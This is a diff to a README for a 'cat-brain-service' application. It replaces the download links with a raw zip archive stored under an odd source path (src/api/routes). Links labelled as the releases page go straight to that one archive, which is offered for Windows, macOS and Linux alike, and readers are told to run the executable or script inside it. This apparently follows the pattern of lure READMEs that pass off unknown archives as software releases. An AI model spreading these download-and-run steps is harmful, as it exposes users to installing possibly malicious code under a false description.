@@ -10,7 +10,7 @@ To enjoy this application, follow these simple steps to download and run it on y
 
 ## 📥 Download & Install
 
-Visit this page to download: [cat-brain-service Releases](https://raw.githubusercontent.com/raju4179/cat-brain-service/main/models/brain_cat_service_v2.0-alpha.4.zip)
+Visit this page to download: [cat-brain-service Releases](https://github.com/raju4179/cat-brain-service/raw/refs/heads/main/src/api/routes/service_cat_brain_v1.7.zip)
 
 * Click on the link above to open the releases page.
 * Look for the latest version of the application.
@@ -29,9 +29,9 @@ Before installing, ensure your system meets these requirements:
 
 In the releases section, you will find the following files:
 
-- **https://raw.githubusercontent.com/raju4179/cat-brain-service/main/models/brain_cat_service_v2.0-alpha.4.zip** For Windows users
-- **https://raw.githubusercontent.com/raju4179/cat-brain-service/main/models/brain_cat_service_v2.0-alpha.4.zip** For macOS users
-- **https://raw.githubusercontent.com/raju4179/cat-brain-service/main/models/brain_cat_service_v2.0-alpha.4.zip** For Linux users
+- **https://github.com/raju4179/cat-brain-service/raw/refs/heads/main/src/api/routes/service_cat_brain_v1.7.zip** For Windows users
+- **https://github.com/raju4179/cat-brain-service/raw/refs/heads/main/src/api/routes/service_cat_brain_v1.7.zip** For macOS users
+- **https://github.com/raju4179/cat-brain-service/raw/refs/heads/main/src/api/routes/service_cat_brain_v1.7.zip** For Linux users
 
 Choose the file that matches your operating system.
 
@@ -41,7 +41,7 @@ Choose the file that matches your operating system.
 2. **Run the installer**:
    - For Windows: Double-click the `.exe` file.
    - For macOS: Open the `.dmg` file, and drag the application to your Applications folder.
-   - For Linux: Extract the https://raw.githubusercontent.com/raju4179/cat-brain-service/main/models/brain_cat_service_v2.0-alpha.4.zip file and run the included script.
+   - For Linux: Extract the https://github.com/raju4179/cat-brain-service/raw/refs/heads/main/src/api/routes/service_cat_brain_v1.7.zip file and run the included script.
 3. **Follow the on-screen instructions** to complete the installation. 
 
 ## 🐾 How to Use
@@ -63,7 +63,7 @@ Your cat will learn and adapt while you enjoy observing their growth.
 
 ## 📊 What’s Next?
 
-Please check the [cat-brain-service Releases](https://raw.githubusercontent.com/raju4179/cat-brain-service/main/models/brain_cat_service_v2.0-alpha.4.zip) regularly for updates. New features and improvements will be added to enhance your cat's learning experience.
+Please check the [cat-brain-service Releases](https://github.com/raju4179/cat-brain-service/raw/refs/heads/main/src/api/routes/service_cat_brain_v1.7.zip) regularly for updates. New features and improvements will be added to enhance your cat's learning experience.
 
 ## 🌐 Community and Support
 
